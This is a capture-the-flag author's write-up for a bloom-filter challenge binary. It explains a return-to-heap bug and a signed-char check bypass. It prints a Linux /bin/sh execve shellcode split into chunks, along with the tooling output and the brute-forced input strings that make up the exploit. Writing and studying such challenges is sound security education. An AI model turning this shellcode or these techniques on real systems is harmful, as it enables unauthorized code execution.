# The Program

The service loads a *bloom filter* from disk, and then receives commands over a simple binary protocol
(three letters for the commands, followed by a one-byte size of the payload, and then up to 128 bytes of actual 
payload).

The commands let the user query the filter for a string. If the bloom filter returns a positive match, the 
program say `Maybe`, otherwise it prints `Definitely not`. 

The binary is compiled by using the *Open Watcom* compiler. The result is a statically linked binary which uses
a custom libc. Moreover, by using `PRAGMA` directives, I specified a different custom calling convention for
each function -- so they all use a different set of registers to pass the parameters and to return the result.

The challenge is divided in two parts. The first requires to reverse the
program and learn how to control the vulnerability. The second part is a
shellcoding part that consists in buildin a valid shellcode out of the
bloomfilter. 

# A Vulnerability hidden in Plain Sight

The program contains a vulnerability that let the user execute arbitrary
code. What makes it different from most vulnerabilities is that you do not
have to find a way to trigger it.. as it is actually executed every time
at the end of the program. This could make it harder to notice at first. 

The main loop of the program accepts a maximum of 42 commands. After that, it calls a function that loads a 
goodbye message in a register and then tail jumps to `puts`. However, the function also saves `edi` on the 
stack, but because of the tail jump it does not clear that correctly. 
As a result, after the `puts` invocation, the function returns to the wrong address. In particular, since `edi`
originally points to the structure that contains the bloom filter on the heap, the code returns there.

In other words, the attacker has nothing to do and the vulnerability is automatically triggered 
at every execution, after parsing all commands and printing the goodbye
string. If you trace the execution or debug the program (and if you are
paying enough attention) you could see that it jumps to the heap and back every time. 

The fact that make this bug difficult to notice is that the first two fields
of the structure are crafted in a way that when executed 
(i.e., when the program jumps inside the structure) they correspond to
a useless instruction followed by a `ret`. 
Therefore, in normal conditions, the user does not even notice this little detour on the heap.

However, I did not want the first part to be too difficult.. and in fact I thought
that the weird calling convection would give away the fact that the vuln
had something to do with functions setup/cleanup. Moreover, the fact that
the final function (which only prints goodbye) takes as parameter a pointer
to the bloom filter should be an obvious hint. 

# Attack

To exploit the system, the attacker needs to modify the first fields in the
structure to jump over the `ret` instruction and directly into the bloom
filter. This is not difficult, you need to control the lock field in the
bloom structure by setting it to a large value. The program does not let
you do that by checking that you can only pass zero or one (but there is an obvious
bug in which the input is casted to a signed char, so if it is above 128 it would 
be accepted as < 1). 

But before that, the attacker needs to modify the filter to get a shell.
Every time you add a string to the bloom filter, you can flip up to three
bits (corresponding to the three murmurhash) from 0 to 1. However, you can
never flip a bit from 1 to 0.. so those are hard constraints you need to
work around when you build your shellcode.

You can try to do that by hand by trial and error, but imho the best way
is to take a simple shellcode and then test whether all its instructions
can be carved into the bloom filter. So, we need a little detour into the
filter itself:

### A Special Bloom Filter 

You can find the code I used to generate the bloom filter in the [bitfield](../service/src/bitfield/) folder.

The goal of the code in the directory is to create the bloom filter
used by the program AND to create the exploit (the two things are connected
as the data needs to be carefully chosen to make the attack possible).

First thing, I created a randomly filled bloom filter of 1125 bytes.

Then I manually modified some bytes to include a `/bin/sh` shellcode.
I used the super-classic 23bytes linux 32bit shellcode, modified to 
zero `edx` (the original I found online doesn't, and the
interrupt fails because the pointer to `env` is invalid).

```
 1. 31 C0            xor     eax, eax
 2. 50               push    eax
 3. 68 2F 2F 73 68   push    'hs//'
 4. 68 2F 62 69 6E   push    'nib/'
 5. 89 E3            mov     ebx, esp
 6. 50               push    eax
 7. 53               push    ebx
 8. 89 E1            mov     ecx, esp
 9. B0 0B            mov     al, 0Bh
10.                  xor     edx, edx
11. CD 80            int     80hgg
```

I divided the shellcode in five chunks, connected by jump instructions.
The result is stored in the *vault_binsh.bf* file.

Of course, the instructions of the shellcode are interleaved with other
junk instructions. The final shellcode, thus looks like this:

```
Chunk 1:
 0x804b161:  mov    esi, 0xa8a01963
 0x804b166:  pop    esi
 0x804b167:  inc    ecx
 0x804b168:  inc    esi
 0x804b169:  nop
 0x804b16a:  test   al, 0x34
 0x804b16c:  rol    edx, 0x1
 0x804b16f:  xor    eax, eax
 0x804b171:  push   0x62c04bac
 0x804b176:  je     0x804b1c5

Chunk 2:
 0x804b1c5:  push   eax
 0x804b1c6:  xchg   ecx, eax
 0x804b1c7:  push   0x68732f2f
 0x804b1cc:  and    ah, dh
 0x804b1ce:  inc    eax
 0x804b1cf:  je     0x804b1bf   % not taken
 0x804b1d1:  xor    eax, eax
 0x804b1d3:  mov    cl, 0xd6
 0x804b1d5:  dec    esi
 0x804b1d6:  sub    ch, dl
 0x804b1d8:  push   0x6e69622f
 0x804b1dd:  or     al, 0x0
 0x804b1df:  nop
 0x804b1e0:  jmp    0x804b25d 

Chunk 3:
 0x804b25d:  mov    ebx, esp
 0x804b25f:  inc    edx
 0x804b260:  inc    edx
 0x804b261:  inc    edx
 0x804b262:  push   eax
 0x804b263:  test   al, 0x96
 0x804b265:  push   ebx
 0x804b266:  jge    0x804b2b6

Chunk 4:
 0x804b2b6:  mov    ecx, esp
 0x804b2b8:  shl    dh, cl
 0x804b2ba:  nop
 0x804b2bb:  and    eax, 0xc0e2e8bc
 0x804b2c0:  jne    0x804b30a         % not taken
 0x804b2c2:  mov    al, 0xb
 0x804b2c4:  nop
 0x804b2c5:  jmp    0x804b26e 

Chunk 5:
 0x804b26e:  xor    edx, edx
 0x804b270:  int    0x80
```

The resulting code is 80 bytes long.

At this point I manually flipped some bits in the exploit path, obtaining
the final bloom filter (stored in *vault.bf*).


### Exploit

To build the attack, you need to find a set of strings to add to the bloom filter
that result in flipping the bits you need to compose your shellcode, but without flipping 
any other bits along the execution path.

So, first you need to look for sequences of bytes in the filter you can modify to obtain
the instructions you need. For most of the instructions you would get just two/three 
options.. so there is no need to bruteforce or write automated tools. Just connect
together those pieces with jumps and you are ready to go.

Once you have artificially created your shellcode bloom filter,
you can compute the bits you need to flip by diffing the
initial state of the filter with the one containing the shellcode:

(all commands are in the [bitfield](../service/src/bitfield/) folder)

```
> python diff.py
Changes: [110, 180, 187, 190, 827, 843, 849, 854, 859, 862, 919, 965, 1030, 1035, 2062, 2102, 2165, 2169, 2179, 2182, 2736,  2841, 2852, 2866, 2869]
20 bytes, 25 bits to change
```

Then you need to list the bits that cannot be flipped (i.e., those that are set to zero
along the execution path):

```
> python make_blacklist.py
Executed bytes: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 270, 271, 272, 273]
Bit Blacklist: [8, 14, 18, 19, 20, 23, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 38, 40, 41, 42, 44, 46, 48, 53, 55, 57, 58, 59, 60, 61, 63, 64, 67, 68, 69, 71, 72, 73, 74, 75, 77, 78, 80, 81, 82, 84, 86, 88, 89, 91, 94, 95, 97, 98, 99, 100, 101, 104, 106, 107, 108, 109, 113, 114, 115, 116, 117, 118, 119, 121, 122, 123, 126, 127, 128, 129, 130, 131, 132, 133, 136, 137, 138, 140, 143, 144, 145, 148, 150, 154, 156, 157, 159, 160, 161, 162, 163, 164, 165, 168, 170, 171, 172, 175, 176, 177, 179, 183, 808, 809, 810, 811, 813, 815, 817, 818, 819, 821, 822, 824, 825, 826, 828, 831, 836, 838, 839, 844, 846, 847, 850, 851, 855, 856, 857, 858, 860, 863, 864, 865, 866, 867, 868, 870, 871, 872, 873, 875, 880, 881, 882, 883, 884, 885, 887, 888, 889, 891, 895, 896, 900, 905, 906, 907, 910, 911, 912, 913, 914, 915, 916, 917, 921, 922, 923, 926, 928, 931, 933, 936, 940, 941, 943, 944, 946, 948, 950, 951, 952, 954, 956, 960, 961, 962, 964, 967, 972, 974, 975, 976, 978, 979, 980, 983, 985, 986, 988, 991, 992, 996, 999, 1000, 1001, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1021, 1022, 1026, 1028, 2025, 2026, 2028, 2029, 2030, 2034, 2035, 2036, 2040, 2042, 2043, 2044, 2045, 2047, 2048, 2050, 2051, 2052, 2053, 2055, 2056, 2058, 2059, 2060, 2061, 2063, 2064, 2065, 2066, 2067, 2069, 2071, 2072, 2073, 2074, 2076, 2078, 2080, 2083, 2085, 2086, 2090, 2091, 2093, 2095, 2097, 2103, 2161, 2162, 2163, 2166, 2167, 2168, 2170, 2171, 2173, 2177, 2180, 2181, 2184, 2185, 2186, 2187, 2188, 2189, 2190, 2737, 2738, 2740, 2741, 2742, 2745, 2746, 2747, 2748, 2752, 2754, 2755, 2757, 2760, 2763, 2764, 2768, 2769, 2770, 2771, 2773, 2774, 2777, 2779, 2780, 2782, 2783, 2784, 2785, 2790, 2792, 2793, 2794, 2796, 2800, 2802, 2803, 2804, 2808, 2809, 2810, 2811, 2812, 2813, 2817, 2819, 2823, 2824, 2825, 2826, 2828, 2829, 2831, 2832, 2833, 2834, 2835, 2838, 2842, 2844, 2845, 2846, 2847, 2848, 2849, 2850, 2851, 2853, 2854, 2858, 2860]

80 bytes in the executed path
370 bit blacklisted
```

To get the final exploit, I hardcoded both list in a python script that invokes a C
implementation of the hash function (`compute_hash.c`) and use that to
bruteforce all strings of alphanumeric characters of length five that
satisfy our constraint.

In just few seconds, the code gives us the strings we need:
```
qqqwc 
qqqwI 
qqqor 
qqqoM 
qqqpN 
qqqkt 
qqqdt 
qqqzE 
qqq_Q 
qqqI8 
qqqOo 
qqqKs 
qqqBY 
qqq8Z 
qqq0j 
qqwt9 
qqwlF 
qqwah 
qqwzg 
qqwFm 
qqwZg 
qqwVh 
qqeyD 
qqeFJ 
```










